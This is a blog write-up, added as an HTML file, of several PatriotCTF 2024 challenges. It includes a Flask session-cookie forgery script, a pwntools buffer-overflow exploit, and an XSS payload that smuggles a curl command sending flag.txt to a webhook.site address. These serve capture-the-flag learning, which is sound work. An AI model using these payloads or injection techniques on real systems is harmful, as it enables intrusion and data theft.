@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PatriotCTF shortWU | sm1le</title>
+<meta name="keywords" content="write-up, PatriotCTF">
+<meta name="description" content="PatriotCTF shortWU">
+<meta name="author" content="Me">
+<link rel="canonical" href="//localhost:1313/posts/patriotctf-wu/post/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.4599eadb9eb2ad3d0a8d6827b41a8fda8f2f4af226b63466c09c5fddbc8706b7.css" integrity="sha256-RZnq256yrT0KjWgntBqP2o8vSvImtjRmwJxf3byHBrc=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/assets/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/posts/patriotctf-wu/post/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="PatriotCTF shortWU" />
+<meta property="og:description" content="PatriotCTF shortWU" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="//localhost:1313/posts/patriotctf-wu/post/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-09-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-09-21T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PatriotCTF shortWU"/>
+<meta name="twitter:description" content="PatriotCTF shortWU"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "//localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PatriotCTF shortWU",
+      "item": "//localhost:1313/posts/patriotctf-wu/post/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PatriotCTF shortWU",
+  "name": "PatriotCTF shortWU",
+  "description": "PatriotCTF shortWU",
+  "keywords": [
+    "write-up", "PatriotCTF"
+  ],
+  "articleBody": "Web giraffe notes The code ban HTTP-X-Forwarded-For header, but we can use X-Forwarded-Host header to bypass it.\nImpersonate First, I get server_start_time by get the respone from /status page. Then, I use flask-unsign to generate a cookie with is_admin set to True and username set to administrator. Then, I send a request to the admin page with this cookie to get the flag.\nCode exploit:\nimport os, requests from datetime import datetime, timedelta import hashlib import subprocess res = requests.get('http://chal.competitivecyber.club:9999/status') server_up_time_str = res.content.split(b'Server uptime: ')[1].split(b'\n')[0].decode() server_time_str = res.content.split(b'Server time: ')[1].decode() uptime_parts = server_up_time_str.split(':') server_up_time = timedelta(hours=int(uptime_parts[0]), minutes=int(uptime_parts[1]), seconds=int(uptime_parts[2])) server_time = datetime.strptime(server_time_str.strip(), '%Y-%m-%d %H:%M:%S') server_start_time = server_time - server_up_time print(\"Server start time:\", server_start_time) server_start_str = server_start_time.strftime('%Y%m%d%H%M%S') secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest() cmd_out = subprocess.check_output(['flask-unsign', '--sign', '--cookie', \"{'is_admin': True, 'username': 'administrator'}\", '--secret', secure_key]) cookie = {'session' : cmd_out.decode().rstrip()} response = requests.get('http://chal.competitivecyber.club:9999/admin', cookies=cookie) print(response.text) Open Seasame The server has a XSS vulnerability in /api/stats/ because the Content-Type header is not set, so the browser will render the response as HTML. I inject script to username params and create id with this username on /api/stats page. After getting that id, send this url to bot. The bot will visit this url and execute the script.\nInjected script:\n\u003cscript\u003efetch('/api/cal?modifier=;curl https://webhook.site/8f530448-4e2b-4697-909b-9b9a9721c8c0?$(cat flag.txt)')\u003c/script\u003e Reverse Revioli from base64 import b64decode, b64encode import secrets flipFlops = lambda x: chr(ord(x) - 1) s=\"Mwahahaha you will nOcmu{9gtufever crack into my passMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ympword, i'll even give you the key and the executable:::: Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV\" fourth = \"Ocmu{9gtuf\"+ \"MmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp\" bittysEnc = \"Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV\" bittys = b64decode(bittysEnc) third = \"\" for each in fourth: third += flipFlops(each) second = b64decode(third) onePointFive = int.from_bytes(second, \"big\") first = onePointFive ^ int.from_bytes(bittys, \"big\") print(first.to_bytes(len(second), \"big\")) Packed Full Of Surprises First, using upx to unpack. The unpacked code is AES-EFB encryption.\nfrom Crypto.Cipher import AES from Crypto.Util.Padding import unpad import struct def decrypt_file(input_file, output_file, key, iv): # Create AES cipher object in CFB mode cipher = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128) with open(input_file, 'rb') as infile, open(output_file, 'wb') as outfile: while True: chunk = infile.read(16) # Read in 16-byte chunks if len(chunk) == 0: break decrypted_chunk = cipher.decrypt(chunk) outfile.write(decrypted_chunk) # Key and IV from the C code key = struct.pack('",
+  "wordCount" : "405",
+  "inLanguage": "en",
+  "datePublished": "2024-09-21T00:00:00Z",
+  "dateModified": "2024-09-21T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "//localhost:1313/posts/patriotctf-wu/post/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "sm1le",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "//localhost:1313/assets/favicon.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="sm1le (Alt + H)">sm1le</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PatriotCTF shortWU
+    </h1>
+    <div class="post-description">
+      PatriotCTF shortWU
+    </div>
+    <div class="post-meta"><span title='2024-09-21 00:00:00 +0000 UTC'>September 21, 2024</span>&nbsp;·&nbsp;Me
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="web">Web<a hidden class="anchor" aria-hidden="true" href="#web">#</a></h2>
+<h3 id="giraffe-notes">giraffe notes<a hidden class="anchor" aria-hidden="true" href="#giraffe-notes">#</a></h3>
+<p>The code ban HTTP-X-Forwarded-For header, but we can use X-Forwarded-Host header to bypass it.</p>
+<h3 id="impersonate">Impersonate<a hidden class="anchor" aria-hidden="true" href="#impersonate">#</a></h3>
+<p>First, I get <code>server_start_time</code> by get the respone from /status page. Then, I use <a href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a> to generate a cookie with <code>is_admin</code> set to <code>True</code> and <code>username</code> set to <code>administrator</code>. Then, I send a request to the admin page with this cookie to get the flag.</p>
+<p>Code exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os<span style="color:#f92672">,</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> datetime <span style="color:#f92672">import</span> datetime, timedelta
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
+</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://chal.competitivecyber.club:9999/status&#39;</span>)
+</span></span><span style="display:flex;"><span>server_up_time_str <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Server uptime: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>server_time_str <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>content<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Server time: &#39;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>uptime_parts <span style="color:#f92672">=</span> server_up_time_str<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>server_up_time <span style="color:#f92672">=</span> timedelta(hours<span style="color:#f92672">=</span>int(uptime_parts[<span style="color:#ae81ff">0</span>]), minutes<span style="color:#f92672">=</span>int(uptime_parts[<span style="color:#ae81ff">1</span>]), seconds<span style="color:#f92672">=</span>int(uptime_parts[<span style="color:#ae81ff">2</span>]))
+</span></span><span style="display:flex;"><span>server_time <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>strptime(server_time_str<span style="color:#f92672">.</span>strip(), <span style="color:#e6db74">&#39;%Y-%m-</span><span style="color:#e6db74">%d</span><span style="color:#e6db74"> %H:%M:%S&#39;</span>)
+</span></span><span style="display:flex;"><span>server_start_time <span style="color:#f92672">=</span> server_time <span style="color:#f92672">-</span> server_up_time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Server start time:&#34;</span>, server_start_time)
+</span></span><span style="display:flex;"><span>server_start_str <span style="color:#f92672">=</span> server_start_time<span style="color:#f92672">.</span>strftime(<span style="color:#e6db74">&#39;%Y%m</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">%H%M%S&#39;</span>)
+</span></span><span style="display:flex;"><span>secure_key <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;secret_key_</span><span style="color:#e6db74">{</span>server_start_str<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>cmd_out <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;flask-unsign&#39;</span>, <span style="color:#e6db74">&#39;--sign&#39;</span>, <span style="color:#e6db74">&#39;--cookie&#39;</span>, <span style="color:#e6db74">&#34;{&#39;is_admin&#39;: True, &#39;username&#39;: &#39;administrator&#39;}&#34;</span>, <span style="color:#e6db74">&#39;--secret&#39;</span>, secure_key])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookie <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;session&#39;</span> : cmd_out<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>rstrip()}
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://chal.competitivecyber.club:9999/admin&#39;</span>, cookies<span style="color:#f92672">=</span>cookie)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><h3 id="open-seasame">Open Seasame<a hidden class="anchor" aria-hidden="true" href="#open-seasame">#</a></h3>
+<p><img loading="lazy" src="image.png" alt="alt text"  />
+
+The server has a XSS vulnerability in <code>/api/stats/&lt;id&gt;</code> because the Content-Type header is not set, so the browser will render the response as HTML. I inject script to  <code>username</code> params and create id with this username on <code>/api/stats</code> page. After getting that id, send this url to bot. The bot will visit this url and execute the script.</p>
+<p>Injected script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/api/cal?modifier=;curl https://webhook.site/8f530448-4e2b-4697-909b-9b9a9721c8c0?$(cat flag.txt)&#39;</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span></code></pre></div><h2 id="reverse">Reverse<a hidden class="anchor" aria-hidden="true" href="#reverse">#</a></h2>
+<h3 id="revioli">Revioli<a hidden class="anchor" aria-hidden="true" href="#revioli">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b64decode, b64encode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>flipFlops <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: chr(ord(x) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Mwahahaha you will nOcmu{9gtufever crack into my passMmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ympword, i&#39;ll even give you the key and the executable:::: Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>fourth <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Ocmu{9gtuf&#34;</span><span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;MmQg8G0eCXWi3MY9QfZ0NjCrXhzJEj50fumttU0ymp&#34;</span>
+</span></span><span style="display:flex;"><span>bittysEnc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Zfo5ibyl6t7WYtr2voUEZ0nSAJeWMcN3Qe3/+MLXoKL/p59K3jgV&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bittys <span style="color:#f92672">=</span> b64decode(bittysEnc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>third <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> each <span style="color:#f92672">in</span> fourth:
+</span></span><span style="display:flex;"><span>    third <span style="color:#f92672">+=</span> flipFlops(each)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>second <span style="color:#f92672">=</span> b64decode(third)
+</span></span><span style="display:flex;"><span>onePointFive <span style="color:#f92672">=</span> int<span style="color:#f92672">.</span>from_bytes(second, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>first <span style="color:#f92672">=</span> onePointFive <span style="color:#f92672">^</span> int<span style="color:#f92672">.</span>from_bytes(bittys, <span style="color:#e6db74">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>print(first<span style="color:#f92672">.</span>to_bytes(len(second), <span style="color:#e6db74">&#34;big&#34;</span>))
+</span></span></code></pre></div><h3 id="packed-full-of-surprises">Packed Full Of Surprises<a hidden class="anchor" aria-hidden="true" href="#packed-full-of-surprises">#</a></h3>
+<p>First, using <code>upx</code> to unpack. The unpacked code is AES-EFB encryption.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Cipher <span style="color:#f92672">import</span> AES
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.Padding <span style="color:#f92672">import</span> unpad
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_file</span>(input_file, output_file, key, iv):
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Create AES cipher object in CFB mode</span>
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> AES<span style="color:#f92672">.</span>new(key, AES<span style="color:#f92672">.</span>MODE_CFB, iv<span style="color:#f92672">=</span>iv, segment_size<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span>)
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> open(input_file, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> infile, open(output_file, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> outfile:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>            chunk <span style="color:#f92672">=</span> infile<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">16</span>)  <span style="color:#75715e"># Read in 16-byte chunks</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> len(chunk) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>            decrypted_chunk <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decrypt(chunk)
+</span></span><span style="display:flex;"><span>            outfile<span style="color:#f92672">.</span>write(decrypted_chunk)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Key and IV from the C code</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;QQQQ&#39;</span>, <span style="color:#ae81ff">0xEFCDAB8967452301</span>, <span style="color:#ae81ff">0xFEDCBA9876543210</span>, <span style="color:#ae81ff">0x8796A5B4C3D2E1F0</span>, <span style="color:#ae81ff">0xF1E2D3C4B5A6978</span>)
+</span></span><span style="display:flex;"><span>iv <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;QQ&#39;</span>, <span style="color:#ae81ff">0x706050403020100</span>, <span style="color:#ae81ff">0xF0E0D0C0B0A0908</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the file</span>
+</span></span><span style="display:flex;"><span>decrypt_file(<span style="color:#e6db74">&#39;flag.txt.enc&#39;</span>, <span style="color:#e6db74">&#39;flag_decrypted.txt&#39;</span>, key, iv)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Decryption complete. Check &#39;flag_decrypted.txt&#39; for the result.&#34;</span>)
+</span></span></code></pre></div><h2 id="pwn">Pwn<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h2>
+<h3 id="not-so-shrimple-is-it">Not So Shrimple Is It<a hidden class="anchor" aria-hidden="true" href="#not-so-shrimple-is-it">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> p64
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;chal.competitivecyber.club&#39;</span>,<span style="color:#ae81ff">8884</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># r = process(&#39;./shrimple&#39;)</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">43</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;o&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">42</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">38</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x82\x12\x40\0</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="//localhost:1313/tags/write-up/">Write-Up</a></li>
+      <li><a href="//localhost:1313/tags/patriotctf/">PatriotCTF</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
